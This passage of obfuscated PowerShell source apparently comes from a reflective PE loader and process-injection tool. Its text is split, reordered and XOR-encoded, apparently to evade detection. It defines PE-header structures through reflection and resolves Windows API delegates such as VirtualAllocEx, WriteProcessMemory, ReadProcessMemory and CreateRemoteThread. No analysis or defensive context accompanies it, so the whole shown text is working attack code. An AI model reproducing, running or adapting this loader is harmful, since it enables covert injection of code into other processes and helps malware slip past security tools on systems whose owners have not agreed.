            $VAR010 | Add-Member -MemberType ('N'+'oteProper'+'ty') -Name ('C'+'ONST118') -Value $VAR024

            
            $VAR019 = ("{12}{2}{5}{8}{11}{14}{10}{9}{0}{13}{6}{7}{1}{4}{3}"-f'yout, ','reF',' AnsiClass, Class, ','eldInit','i','Public, Se',', B','efo','que','a','lL','nti','AutoLayout,','Sealed','a')
            $VAR011 = $VAR014.DEfinetYpE(("{1}{2}{0}"-f '164','CON','ST03'), $VAR019, [System.ValueType], 264)
            $VAR011.deFInEfIELd(("{1}{0}{2}" -f'at','Sign','ure'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | Out-Null
            $VAR011.deFINefielD(("{0}{2}{1}" -f'CONST1','1','2'), $VAR022, ("{0}{1}"-f 'Publi','c')) | Out-Null
            $VAR011.dEfinEFiEld(("{0}{1}" -f'CONS','T122'), $VAR023, ("{1}{0}"-f 'blic','Pu')) | Out-Null
            $VAR025 = $VAR011.CREAtetYpE()
            $VAR010 | Add-Member -MemberType ('N'+'o'+'teProperty') -Name ('C'+'ONST'+'03164') -Value $VAR025

            
            $VAR019 = ("{13}{6}{8}{2}{16}{17}{3}{14}{15}{10}{9}{11}{5}{12}{0}{7}{1}{4}"-f ' Be','dIni',' AnsiCla','ic, ','t','led','ayo','foreFiel','ut,','Lay','l','out, Sea',',','AutoL','Seque','ntia','ss, Class, Pub','l')
            $VAR011 = $VAR014.DeFiNeTYpE(("{0}{2}{1}"-f 'CONST','132','03'), $VAR019, [System.ValueType], 248)
            $VAR011.DEFINeFieLD(("{0}{2}{3}{1}"-f 'Sig','ure','n','at'), [UInt32], ("{0}{2}{1}" -f'Pub','ic','l')) | Out-Null
            $VAR011.DefinefIelD(("{2}{1}{0}" -f'1','NST12','CO'), $VAR022, ("{0}{1}" -f'Publ','ic')) | Out-Null
            $VAR011.DeFInEFIeld(("{2}{1}{0}" -f'2','ONST12','C'), $VAR024, ("{1}{2}{0}"-f'c','Pub','li')) | Out-Null
            $VAR026 = $VAR011.creaTetyPe()
            $VAR010 | Add-Member -MemberType ('Not'+'ePropert'+'y') -Name ('CO'+'N'+'ST03132') -Value $VAR026

            
            $VAR019 = ("{5}{9}{11}{4}{22}{17}{16}{12}{14}{15}{23}{13}{6}{18}{3}{0}{8}{19}{2}{20}{1}{7}{10}{21}"-f'lLay','ie','ea','Sequentia','yout, A','Au','lic','ldI','ou','toL','n','a','s',' Pub','s, C','la','a','iCl',', ','t, S','led, BeforeF','it','ns','ss,')
            $VAR011 = $VAR014.DefinetYpe(("{0}{1}" -f'CONST','123'), $VAR019, [System.ValueType], 64)
            $VAR011.DeFinefiElD(("{1}{0}{2}" -f 'ONS','C','T124'), [UInt16], ("{2}{1}{0}" -f 'c','bli','Pu')) | Out-Null
            $VAR011.defiNeField(("{1}{0}"-f'NST125','CO'), [UInt16], ("{0}{1}{2}" -f 'Publ','i','c')) | Out-Null
            $VAR011.DefiNeFIELd(("{1}{0}{2}" -f'NST12','CO','6'), [UInt16], ("{1}{0}" -f 'ublic','P')) | Out-Null
            $VAR011.DEFINefIELd(("{1}{2}{0}"-f'7','C','ONST12'), [UInt16], ("{0}{1}"-f'Publ','ic')) | Out-Null
            $VAR011.DefINefIELd(("{0}{2}{1}" -f 'C','128','ONST'), [UInt16], ("{1}{0}" -f'ic','Publ')) | Out-Null
            $VAR011.DEFinefieLD(("{1}{0}{2}"-f 'ONST','C','129'), [UInt16], ("{0}{1}"-f'P','ublic')) | Out-Null
            $VAR011.defIneFiELd(("{0}{1}" -f 'CONST','130'), [UInt16], ("{1}{0}" -f 'ublic','P')) | Out-Null
            $VAR011.dEFiNEfiELd(("{1}{2}{0}" -f'1','CO','NST13'), [UInt16], ("{0}{1}"-f 'Pu','blic')) | Out-Null
            $VAR011.DefIneFieLd(("{2}{0}{1}"-f'ST1','32','CON'), [UInt16], ("{1}{2}{0}"-f'ic','Pub','l')) | Out-Null
            $VAR011.DEfInEFieLd(("{1}{0}"-f 'NST133','CO'), [UInt16], ("{0}{1}" -f'P','ublic')) | Out-Null
            $VAR011.dEFiNEfiELD(("{0}{2}{1}" -f'CO','4','NST13'), [UInt16], ("{0}{1}{2}"-f'Publ','i','c')) | Out-Null
            $VAR011.defINeField(("{2}{0}{1}"-f'T','135','CONS'), [UInt16], ("{2}{0}{1}"-f 'l','ic','Pub')) | Out-Null
            $VAR011.DEfinEfiEld(("{0}{2}{1}"-f 'CONST','36','1'), [UInt16], ("{1}{0}"-f 'ic','Publ')) | Out-Null
            $VAR011.DefineFiElD(("{1}{0}"-f'ST137','CON'), [UInt16], ("{0}{1}"-f 'Publi','c')) | Out-Null

            $VAR027 = $VAR011.deFinEFieLd(("{1}{0}{2}"-f'T13','CONS','8'), [UInt16[]], ("{0}{1}{2}{4}{3}"-f'P','u','blic','ldMarshal',', HasFie'))
            $VAR028 =  $dtwM::BYvAlaRraY
            $VAR029 = @(  (  vARIAble ("7OV"+"iX")).VAluE.GEtfield(("{1}{0}{2}"-f 'Con','Size','st')))
            $VAR030 = New-Object ('System.R'+'e'+'flec'+'t'+'i'+'on.Emit.Cust'+'omAt'+'trib'+'uteBui'+'ld'+'er')($VAR015, $VAR028, $VAR029, @([Int32] 4))
            $VAR027.sETCUSToMATTrIbutE($VAR030)

            $VAR011.DefINeFIELd(("{1}{0}" -f '39','CONST1'), [UInt16], ("{1}{0}" -f 'blic','Pu')) | Out-Null
            $VAR011.DEfINeFiELD(("{1}{0}{2}"-f'4','CONST1','0'), [UInt16], ("{0}{1}"-f 'P','ublic')) | Out-Null

            $VAR031 = $VAR011.DEfiNefiELd(("{1}{2}{0}" -f'382','CON','ST1'), [UInt16[]], ("{1}{3}{0}{2}{5}{4}" -f'Field','Pu','Mar','blic, Has','l','sha'))
            $VAR028 =  ( variABlE ("DTW"+"m") -VA  )::byValaRRaY
            $VAR030 = New-Object ('System'+'.Reflection.'+'Emit'+'.'+'Custo'+'mAt'+'t'+'ribute'+'Builder')($VAR015, $VAR028, $VAR029, @([Int32] 10))
            $VAR031.seTCuSToMatTrIBUTe($VAR030)

            $VAR011.dEfINEField(("{1}{0}{2}"-f '4','CONST1','1'), [Int32], ("{0}{1}{2}"-f 'Pu','b','lic')) | Out-Null
            $VAR032 = $VAR011.CreAtEtype()
            $VAR010 | Add-Member -MemberType ('NotePro'+'pert'+'y') -Name ('CONST'+'1'+'23') -Value $VAR032

            
            $VAR019 = ("{9}{7}{2}{5}{4}{17}{3}{14}{11}{1}{8}{15}{16}{13}{6}{12}{0}{10}" -f'ialLayout, Sea',' ','L',', A','you','a','ic, Seq','to','Cl','Au','led, BeforeFieldInit','siClass,','uent','Publ','n','a','ss, ','t')
            $VAR011 = $VAR014.defInetypE(("{0}{1}"-f 'CONST','142'), $VAR019, [System.ValueType], 40)

            $VAR033 = $VAR011.dEFiNEfIelD(("{1}{0}"-f'ame','N'), [Char[]], ("{1}{3}{2}{0}{4}{5}" -f'as','Publ',' H','ic,','F','ieldMarshal'))
            $VAR028 =  (gET-vAriabLE  ("dT"+"wM") ).value::bYvalarRay
            $VAR030 = New-Object ('S'+'ystem.Ref'+'l'+'ection.Emi'+'t.'+'C'+'u'+'sto'+'m'+'A'+'ttribut'+'eBui'+'lder')($VAR015, $VAR028, $VAR029, @([Int32] 8))
            $VAR033.seTCuStOMatTrIbUte($VAR030)

            $VAR011.DEFINeFiElD(("{1}{2}{0}"-f'43','CO','NST1'), [UInt32], ("{0}{1}" -f 'Pub','lic')) | Out-Null
            $VAR011.definEfiELD(("{0}{1}{2}"-f 'CO','NS','T074'), [UInt32], ("{1}{0}"-f'ublic','P')) | Out-Null
            $VAR011.dEfiNEFIeLD(("{2}{1}{0}" -f'ST144','ON','C'), [UInt32], ("{0}{1}" -f'Pu','blic')) | Out-Null
            $VAR011.dEFINefiElD(("{0}{1}" -f'CONST14','5'), [UInt32], ("{1}{0}" -f 'ic','Publ')) | Out-Null
            $VAR011.dEFINEFIelD(("{1}{0}{2}" -f'NST1','CO','46'), [UInt32], ("{0}{1}" -f'Publi','c')) | Out-Null
            $VAR011.DefIneFieLd(("{2}{1}{0}" -f'147','ST','CON'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | Out-Null
            $VAR011.dEfIneFieLd(("{1}{2}{0}" -f'8','C','ONST14'), [UInt16], ("{2}{0}{1}"-f'ub','lic','P')) | Out-Null
            $VAR011.DEFineFieLD(("{1}{0}{2}" -f'S','CON','T149'), [UInt16], ("{0}{1}"-f'Publ','ic')) | Out-Null
            $VAR011.DEFiNefieLd(("{0}{1}{2}" -f 'CONST','06','7'), [UInt32], ("{0}{1}" -f'Pub','lic')) | Out-Null
            $VAR034 = $VAR011.cREATEtyPE()
            $VAR010 | Add-Member -MemberType ('Not'+'eP'+'roperty') -Name ('C'+'O'+'NST142') -Value $VAR034

            
            $VAR019 = ("{10}{19}{13}{5}{15}{2}{14}{3}{1}{18}{17}{12}{4}{9}{6}{16}{0}{8}{11}{7}"-f' Before','s, Class,','C','s','alLayout, S',', An','l','eldInit','F','ea','AutoLa','i','ic, Sequenti','t','la','si','ed,','ubl',' P','you')
            $VAR011 = $VAR014.DEfINetYpe(("{1}{2}{0}"-f '50','CON','ST1'), $VAR019, [System.ValueType], 8)
            $VAR011.dEFinEfiELD(("{1}{0}{2}"-f'NST0','CO','74'), [UInt32], ("{1}{0}" -f'ublic','P')) | Out-Null
            $VAR011.DEFInefIEld(("{1}{0}{2}" -f 'N','CO','ST151'), [UInt32], ("{1}{0}" -f'blic','Pu')) | Out-Null
            $VAR035 = $VAR011.CrEATEtypE()
            $VAR010 | Add-Member -MemberType ('Not'+'ePro'+'per'+'ty') -Name ('CON'+'ST'+'150') -Value $VAR035

            
            $VAR019 = ("{0}{9}{2}{8}{11}{3}{6}{5}{4}{12}{7}{10}{1}" -f 'AutoLayout','eldInit','AnsiClass','s, P','quentialLa',' Se','ublic,',' Sea',', ',', ','led, BeforeFi','Clas','yout,')
            $VAR011 = $VAR014.deFinetypE(("{2}{1}{0}"-f'152','ST','CON'), $VAR019, [System.ValueType], 20)
            $VAR011.defInEFielD(("{1}{0}{2}"-f 'ON','C','ST067'), [UInt32], ("{0}{1}"-f 'P','ublic')) | Out-Null
            $VAR011.DEFiNeFIELd(("{1}{0}"-f 'ST071','CON'), [UInt32], ("{1}{0}"-f 'blic','Pu')) | Out-Null
            $VAR011.DEFInEFieLD(("{2}{0}{1}"-f 'ST','153','CON'), [UInt32], ("{0}{1}" -f 'P','ublic')) | Out-Null
            $VAR011.dEFINEFiELd(("{1}{0}"-f'ame','N'), [UInt32], ("{0}{1}{2}" -f 'Publ','i','c')) | Out-Null
            $VAR011.DefiNEfiELD(("{1}{0}"-f'ONST154','C'), [UInt32], ("{2}{1}{0}" -f 'ic','bl','Pu')) | Out-Null
            $VAR036 = $VAR011.CrEATEType()
            $VAR010 | Add-Member -MemberType ('Not'+'ePropert'+'y') -Name ('CONST1'+'52') -Value $VAR036

            
            $VAR019 = ("{12}{2}{11}{0}{3}{8}{10}{13}{1}{7}{9}{5}{4}{6}"-f'ss, Pub','o',', AnsiClass,','li','foreFieldIni','e','t','ut','c, Sequential',', Sealed, B','La',' Cla','AutoLayout','y')
            $VAR011 = $VAR014.dEfiNetyPE(("{0}{1}{2}"-f 'CON','ST','155'), $VAR019, [System.ValueType], 40)
            $VAR011.defInEfIELD(("{1}{2}{0}" -f 'NST067','C','O'), [UInt32], ("{1}{0}"-f 'blic','Pu')) | Out-Null
            $VAR011.DEfiNEfIeLD(("{1}{0}" -f '1','CONST07'), [UInt32], ("{1}{0}"-f 'blic','Pu')) | Out-Null
            $VAR011.defINEFieLD(("{2}{1}{0}" -f '6','T15','CONS'), [UInt16], ("{0}{1}" -f'P','ublic')) | Out-Null
            $VAR011.deFINefiEld(("{0}{1}{2}"-f'CONST','1','57'), [UInt16], ("{0}{1}{2}"-f 'Pu','bli','c')) | Out-Null
            $VAR011.DefInefiELD(("{1}{0}" -f 'me','Na'), [UInt32], ("{1}{0}" -f'ic','Publ')) | Out-Null
            $VAR011.dEfInefieLD(("{0}{1}"-f'Ba','se'), [UInt32], ("{1}{0}"-f'ic','Publ')) | Out-Null
            $VAR011.dEFIneFIeld(("{2}{1}{0}" -f'T158','ONS','C'), [UInt32], ("{1}{0}"-f 'ic','Publ')) | Out-Null
            $VAR011.dEFiNEfield(("{2}{1}{0}"-f'159','NST','CO'), [UInt32], ("{1}{0}" -f'ic','Publ')) | Out-Null
            $VAR011.defInefiElD(("{2}{0}{1}"-f 'NST16','0','CO'), [UInt32], ("{0}{1}{2}" -f'P','u','blic')) | Out-Null
            $VAR011.dEFInEfiELD(("{0}{2}{1}" -f 'CONST','61','1'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | Out-Null
            $VAR011.dEFiNefiELd(("{2}{0}{1}"-f'ONST1','62','C'), [UInt32], ("{0}{1}" -f 'Publ','ic')) | Out-Null
            $VAR037 = $VAR011.CReAteTYpE()
            $VAR010 | Add-Member -MemberType ('No'+'t'+'ePr'+'operty') -Name ('C'+'ONST1'+'55') -Value $VAR037

            
            $VAR019 = ("{7}{3}{14}{15}{17}{2}{12}{18}{16}{8}{4}{0}{5}{19}{9}{6}{11}{1}{13}{20}{10}"-f 'uenti','reFie','C','oLa','eq','alLayout,','ed,','Aut',', S','al','nit',' Befo','lass, ','l','you','t, A',', Public','nsi','Class',' Se','dI')
            $VAR011 = $VAR014.DEFinetYPE(("{0}{1}" -f 'CO','NST163'), $VAR019, [System.ValueType], 8)
            $VAR011.DEFINefIELd(("{0}{1}" -f'CON','ST164'), [UInt32], ("{2}{0}{1}" -f 'ubl','ic','P')) | Out-Null
            $VAR011.dEFINEFieLD(("{1}{2}{0}" -f '5','CO','NST16'), [UInt32], ("{1}{0}" -f'ic','Publ')) | Out-Null
            $VAR038 = $VAR011.crEAtetYpe()
            $VAR010 | Add-Member -MemberType ('No'+'teProp'+'erty') -Name ('CO'+'NST163') -Value $VAR038

            
            $VAR019 = ("{12}{11}{2}{0}{8}{5}{6}{13}{9}{4}{1}{7}{10}{3}" -f 'y','La','La','t','ial','ut, AnsiClass, C','la','yout, Sealed, Befor','o','quent','eFieldIni','o','Aut','ss, Public, Se')
            $VAR011 = $VAR014.DEFiNetypE(("{0}{1}"-f 'CONST16','6'), $VAR019, [System.ValueType], 12)
            $VAR011.DefiNeFIeld(("{0}{2}{1}" -f'C','63','ONST1'), $VAR038, ("{0}{1}" -f 'Publ','ic')) | Out-Null
            $VAR011.dEfInefIeLd(("{1}{2}{0}"-f'tes','A','ttribu'), [UInt32], ("{0}{2}{1}" -f 'Pu','c','bli')) | Out-Null
            $VAR039 = $VAR011.CreATetYpE()
            $VAR010 | Add-Member -MemberType ('NotePr'+'op'+'erty') -Name ('CO'+'NS'+'T166') -Value $VAR039

            
            $VAR019 = ("{3}{10}{5}{13}{11}{12}{0}{1}{7}{8}{6}{15}{9}{4}{2}{14}" -f ', Class',', Publi','eFie','Auto','r','y','entialL','c, Se','qu','efo','La','An','siClass','out, ','ldInit','ayout, Sealed, B')
            $VAR011 = $VAR014.deFInetYPE(("{0}{2}{1}" -f'CONS','7','T16'), $VAR019, [System.ValueType], 16)
            $VAR011.DEfINefIeLd(("{1}{0}{2}" -f'ON','C','ST168'), [UInt32], ("{1}{0}" -f'blic','Pu')) | Out-Null
            $VAR011.definEFIeLd(("{1}{2}{0}" -f'169','CONS','T'), $VAR039, ("{2}{0}{1}" -f 'li','c','Pub')) | Out-Null
            $VAR040 = $VAR011.createtYpe()
            $VAR010 | Add-Member -MemberType ('Not'+'e'+'Property') -Name ('CONST1'+'67') -Value $VAR040

            return $VAR010
        }

        Function F`Un100
        {
        Param(
                [Parameter(PoSition = 0, MAnDATory = $true)]
                [byte[]]
                $VAR0320
            )
            $VAR0322 = [Byte]0x5A
            $VAR0321 = for ($i = 0; $i -lt $VAR0320.LeNgtH; $i++) { [char]([Byte]$VAR0320[$i] -bxor $VAR0322) } -join ''
            #$VA#Write-Host $VAR0321
            #[String]($VAR0321 | ForEach-Object { $_ }) -join ""
            return [String]($VAR0321 | ForEach-Object { $_ }) -join ""
            
        }

        $VAR0303 = [Byte]0x5A
        $VAR0300 = 49,63,40,52,63,54,105,104,116,62,54,54
        $VAR0301 = for ($i = 0; $i -lt $VAR0300.leNgTH; $i++) { [char]([Byte]$VAR0300[$i] -bxor $VAR0303) } -join ''
        $VAR0302 = ($VAR0301 | ForEach-Object { $_ }) -join ""

        $VAR0304 = 27,62,44,59,42,51,105,104,116,62,54,54
        $VAR0305 = for ($i = 0; $i -lt $VAR0304.LENGth; $i++) { [char]([Byte]$VAR0304[$i] -bxor $VAR0303) } -join ''
        $VAR0306 = ($VAR0305 | ForEach-Object { $_ }) -join ""

        $VAR0307 = 55,41,44,57,40,46,116,62,54,54
        $VAR0308 = for ($i = 0; $i -lt $VAR0307.lENGTH; $i++) { [char]([Byte]$VAR0307[$i] -bxor $VAR0303) } -join ''
        $VAR0309 = ($VAR0308 | ForEach-Object { $_ }) -join ""

        $VAR0310 = 29,63,46,10,40,53,57,27,62,62,40,63,41,41
        $VAR0311 = for ($i = 0; $i -lt $VAR0310.LengTh; $i++) { [char]([Byte]$VAR0310[$i] -bxor $VAR0303) } -join ''
        $VAR0312 = ($VAR0311 | ForEach-Object { $_ }) -join ""

        $VAR0313 = 12,51,40,46,47,59,54,27,54,54,53,57
        $VAR0314 = for ($i = 0; $i -lt $VAR0313.lENgTh; $i++) { [char]([Byte]$VAR0313[$i] -bxor $VAR0303) } -join ''
        $VAR0315 = ($VAR0314 | ForEach-Object { $_ }) -join ''

        $VAR0316 = 12,51,40,46,47,59,54,27,54,54,53,57,31,34
        $VAR0317 = for ($i = 0; $i -lt $VAR0316.Length; $i++) { [char]([Byte]$VAR0316[$i] -bxor $VAR0303) } -join ''
        $VAR0318 = ($VAR0317 | ForEach-Object { $_ }) -join ''

                    $VAR0327 = 22,53,59,62,22,51,56,40,59,40,35,27
            $VAR0328 = for ($i = 0; $i -lt $VAR0327.lEnGTH; $i++) { [char]([Byte]$VAR0327[$i] -bxor $VAR0303) } -join ''
            $VAR0329 = ($VAR0328 | ForEach-Object { $_ }) -join ''



        Function fu`N002 {
            $VAR0041 = New-Object ('Sys'+'tem.'+'Obje'+'c'+'t')

            $VAR0041 | Add-Member -MemberType ('Not'+'ePrope'+'r'+'ty') -Name ('C'+'ON'+'ST001') -Value 0x00001000
            $VAR0041 | Add-Member -MemberType ('No'+'te'+'Proper'+'ty') -Name ('CONST'+'002') -Value 0x00002000
            $VAR0041 | Add-Member -MemberType ('NotePrope'+'rt'+'y') -Name ('CO'+'N'+'ST003') -Value 0x01
            $VAR0041 | Add-Member -MemberType ('N'+'ote'+'Property') -Name ('CO'+'NS'+'T004') -Value 0x02
            $VAR0041 | Add-Member -MemberType ('Note'+'Pro'+'pert'+'y') -Name ('CONST0'+'05') -Value 0x04
            $VAR0041 | Add-Member -MemberType ('Not'+'ePrope'+'rt'+'y') -Name ('CON'+'S'+'T006') -Value 0x08
            $VAR0041 | Add-Member -MemberType ('N'+'o'+'teProperty') -Name ('CON'+'ST0'+'07') -Value 0x10
            $VAR0041 | Add-Member -MemberType ('N'+'ote'+'Proper'+'ty') -Name ('CON'+'ST0'+'09') -Value 0x20
            $VAR0041 | Add-Member -MemberType ('N'+'otePr'+'operty') -Name ('CO'+'N'+'ST008') -Value 0x40
            $VAR0041 | Add-Member -MemberType ('Note'+'Prop'+'erty') -Name ('CO'+'NST01'+'0') -Value 0x80
            $VAR0041 | Add-Member -MemberType ('Not'+'eP'+'roperty') -Name ('CONS'+'T01'+'1') -Value 0x200
            $VAR0041 | Add-Member -MemberType ('NoteP'+'rope'+'rty') -Name ('CON'+'S'+'T012') -Value 0
            $VAR0041 | Add-Member -MemberType ('Note'+'P'+'roperty') -Name ('CON'+'S'+'T013') -Value 3
            $VAR0041 | Add-Member -MemberType ('NotePr'+'o'+'pe'+'rty') -Name ('CO'+'NS'+'T014') -Value 10
            $VAR0041 | Add-Member -MemberType ('No'+'te'+'Property') -Name ('C'+'ONST01'+'5') -Value 0x02000000
            $VAR0041 | Add-Member -MemberType ('N'+'o'+'teP'+'roperty') -Name ('CONST01'+'6') -Value 0x20000000
            $VAR0041 | Add-Member -MemberType ('Not'+'e'+'Pr'+'operty') -Name ('CON'+'S'+'T017') -Value 0x40000000
            $VAR0041 | Add-Member -MemberType ('NoteP'+'r'+'op'+'erty') -Name ('C'+'ONST'+'018') -Value 0x80000000
            $VAR0041 | Add-Member -MemberType ('No'+'t'+'eProp'+'erty') -Name ('CONST0'+'1'+'9') -Value 0x04000000
            $VAR0041 | Add-Member -MemberType ('Not'+'eP'+'ro'+'perty') -Name ('C'+'ONST0'+'20') -Value 0x4000
            $VAR0041 | Add-Member -MemberType ('No'+'tePr'+'opert'+'y') -Name ('CONST'+'021') -Value 0x0002
            $VAR0041 | Add-Member -MemberType ('NotePrope'+'rt'+'y') -Name ('CONST'+'0'+'22') -Value 0x2000
            $VAR0041 | Add-Member -MemberType ('No'+'tePro'+'per'+'ty') -Name ('CONST0'+'23') -Value 0x40
            $VAR0041 | Add-Member -MemberType ('No'+'t'+'ePrope'+'rty') -Name ('CON'+'S'+'T024') -Value 0x100
            $VAR0041 | Add-Member -MemberType ('NoteP'+'rop'+'erty') -Name ('CO'+'NST025') -Value 0x8000
            $VAR0041 | Add-Member -MemberType ('N'+'ote'+'Prope'+'rty') -Name ('CONS'+'T026') -Value 0x0008
            $VAR0041 | Add-Member -MemberType ('NotePro'+'per'+'t'+'y') -Name ('C'+'ONST02'+'7') -Value 0x0020
            $VAR0041 | Add-Member -MemberType ('NotePr'+'opert'+'y') -Name ('CONST'+'02'+'8') -Value 0x2
            $VAR0041 | Add-Member -MemberType ('NoteP'+'roper'+'ty') -Name ('CONST'+'0'+'29') -Value 0x3f0

            return $VAR0041
        }

        Function f`U`N003 {
            $VAR0042 = New-Object ('S'+'yste'+'m.'+'Object')

            $VAR0043 = FUN012 $VAR0302 $VAR0315
            $VAR0044 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
            $VAR0045 =   ( gcI ('v'+'ArIA'+'Ble:rt8') ).vALue::gEtdElEgAtefORFUNCtIONPOINTer($VAR0043, $VAR0044)
            $VAR0042 | Add-Member ('NotePrope'+'rt'+'y') -Name ('FUN'+'031') -Value $VAR0045

            $VAR0046 = FUN012 $VAR0302 $VAR0318
            $VAR0047 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
            $VAR0048 =  $rt8::gEtDeLEGAteFoRFUNCTIOnPOiNTEr($VAR0046, $VAR0047)
            $VAR0042 | Add-Member ('N'+'o'+'tePr'+'operty') -Name ('FUN'+'032') -Value $VAR0048

            $VAR0049 = FUN012 $VAR0309 ('m'+'emcpy')
            $VAR0050 = FUN011 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
            $VAR0051 =  ( VARIabLE  ('r'+'t8') -VaLUeo  )::GeTdELegAtEFORfUnctiOnPOiNteR($VAR0049, $VAR0050)
            $VAR0042 | Add-Member -MemberType ('Not'+'eProper'+'ty') -Name ('F'+'UN033') -Value $VAR0051

            $VAR0052 = FUN012 $VAR0309 ('m'+'emset')
            $VAR0053 = FUN011 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
            $VAR0054 =  (gCi ('VArIa'+'BL'+'e:rt'+'8')).Value::gETDeLEgateFORfUncTionPOIntEr($VAR0052, $VAR0053)
            $VAR0042 | Add-Member -MemberType ('No'+'t'+'eP'+'roperty') -Name ('F'+'UN034') -Value $VAR0054

            $VAR0055 = FUN012 $VAR0302 $VAR0329
            $VAR0056 = FUN011 @([String]) ([IntPtr])
            $VAR0057 =   $rt8::GeTDelEgatEForFunCTIonPoINtEr($VAR0055, $VAR0056)
            $VAR0042 | Add-Member -MemberType ('NotePro'+'p'+'ert'+'y') -Name ('FUN03'+'5') -Value $VAR0057

            $VAR0058 = FUN012 $VAR0302 $VAR0312
            $VAR0059 = FUN011 @([IntPtr], [String]) ([IntPtr])
            $VAR0060 =   (chilDitEM  ('V'+'aRiABLE:'+'RT8')  ).VAluE::gETdeLegATEFOrFUnCTIONpoINTEr($VAR0058, $VAR0059)
            $VAR0042 | Add-Member -MemberType ('NoteProp'+'er'+'t'+'y') -Name ('FU'+'N03'+'6') -Value $VAR0060

            $VAR0061 = FUN012 $VAR0302 $VAR0312 
            $VAR0062 = FUN011 @([IntPtr], [IntPtr]) ([IntPtr])
            $VAR0063 =  (gEt-VAriABLe  ('RT'+'8')).vAlUE::GeTdELEGateFoRfuncTIONPOinTEr($VAR0061, $VAR0062)
            $VAR0042 | Add-Member -MemberType ('N'+'otePro'+'perty') -Name ('F'+'UN'+'037') -Value $VAR0063

            $VAR0064 = FUN012 $VAR0302 ('Vir'+'tua'+'lFre'+'e')
            $VAR0065 = FUN011 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VAR0066 =  ( vAriaBLE ('rt'+'8')  ).VAluE::GETdElEGaTEfoRFUnCtiOnpoINTER($VAR0064, $VAR0065)
            $VAR0042 | Add-Member ('N'+'otePrope'+'rty') -Name ('FUN03'+'8') -Value $VAR0066

            $VAR0067 = FUN012 $VAR0302 ('Vir'+'tua'+'lFreeEx')
            $VAR0068 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VAR0069 =  $Rt8::gEtdELEgATeFoRFuNCTionpoIntEr($VAR0067, $VAR0068)
            $VAR0042 | Add-Member ('NotePr'+'o'+'pert'+'y') -Name ('F'+'UN039') -Value $VAR0069

            $VAR0070 = FUN012 $VAR0302 ('Virt'+'ualProt'+'e'+'ct')
            $VAR0071 = FUN011 @([IntPtr], [UIntPtr], [UInt32],   ( lS  ('VArI'+'A'+'BLE'+':5'+'T7l') ).VAluE.maKeBYReftYpe()) ([Bool])
            $VAR0072 =  $rT8::getdELEGAtEforfuNcTiOnPoinTer($VAR0070, $VAR0071)
            $VAR0042 | Add-Member ('NoteP'+'r'+'o'+'perty') -Name ('FUN'+'040') -Value $VAR0072

            $VAR0073 = FUN012 $VAR0302 ('Get'+'M'+'oduleHa'+'n'+'dleA')
            $VAR0074 = FUN011 @([String]) ([IntPtr])
            $VAR0075 =   (  variABLe  ("Rt"+"8")  -VaL )::gEtdEleGateForfuNCTionpOINter($VAR0073, $VAR0074)
            $VAR0042 | Add-Member ('Not'+'ePr'+'ope'+'rty') -Name ('F'+'UN041') -Value $VAR0075

            $VAR0076 = FUN012 $VAR0302 ('FreeLib'+'rar'+'y')
            $VAR0077 = FUN011 @([IntPtr]) ([Bool])
            $VAR0078 =   $RT8::getDelEgATefOrFuNctIONPoINTeR($VAR0076, $VAR0077)
            $VAR0042 | Add-Member -MemberType ('Not'+'e'+'Propert'+'y') -Name ('FUN'+'04'+'2') -Value $VAR0078

            $VAR0079 = FUN012 $VAR0302 ('Open'+'Proc'+'ess')
            $VAR0080 = FUN011 @([UInt32], [Bool], [UInt32]) ([IntPtr])
            $VAR0081 =   $rT8::GeTDeleGAtefOrfuNCTionpoINter($VAR0079, $VAR0080)
            $VAR0042 | Add-Member -MemberType ('NoteP'+'roper'+'t'+'y') -Name ('FUN0'+'43') -Value $VAR0081

            $VAR0082 = FUN012 $VAR0302 ('Wa'+'itFo'+'rSingleOb'+'ject')
            $VAR0083 = FUN011 @([IntPtr], [UInt32]) ([UInt32])
            $VAR0084 =  ( gi ('V'+'Ar'+'iabl'+'E:rt8') ).VAluE::GetdEleGatefoRfuNCtionPOIntER($VAR0082, $VAR0083)
            $VAR0042 | Add-Member -MemberType ('NotePro'+'p'+'erty') -Name ('FU'+'N'+'044') -Value $VAR0084

            $VAR0085 = FUN012 $VAR0302 ('Writ'+'eProces'+'sMem'+'or'+'y')
            $VAR0086 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  ( VaRIabLe  ('Oi'+'4')  -va  ).maKebyrEFType()) ([Bool])
            $VAR0087 =   $rT8::gETDeleGATEfORFUnctIonPointer($VAR0085, $VAR0086)
            $VAR0042 | Add-Member -MemberType ('No'+'t'+'eProperty') -Name ('FUN04'+'5') -Value $VAR0087

            $VAR0088 = FUN012 $VAR0302 ('R'+'eadPro'+'c'+'essM'+'e'+'mory')
            $VAR0089 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   ( VarIABlE  ("O"+"I4")  -VaL  ).MakEByrEftyPE()) ([Bool])
            $VAR0090 =  (  vARIabLe ('R'+'t8')).vaLuE::GeTDEleGatEfoRfunCTIonPoInTer($VAR0088, $VAR0089)
            $VAR0042 | Add-Member -MemberType ('Not'+'eProp'+'ert'+'y') -Name ('F'+'UN046') -Value $VAR0090

            $VAR0091 = FUN012 $VAR0302 ('Cr'+'eateRemote'+'Thre'+'ad')
            $VAR0092 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            $VAR0093 =  $RT8::gEtdEleGATefOrFUnCtionpOinTEr($VAR0091, $VAR0092)
            $VAR0042 | Add-Member -MemberType ('Not'+'ePr'+'opert'+'y') -Name ('FUN0'+'4'+'7') -Value $VAR0093

            $VAR0094 = FUN012 $VAR0302 ('Ge'+'tEx'+'i'+'tCodeThre'+'ad')
            $VAR0095 = FUN011 @([IntPtr],   ( LS ('Va'+'RIAB'+'le:'+'TKd'+'9') ).vAlUe.MAkEBYRefTYPe()) ([Bool])
            $VAR0096 =   (  varIable ("r"+"t8") -vaLuEoNLy  )::gEtDeLegaTEfoRfuNCtIoNPoInteR($VAR0094, $VAR0095)
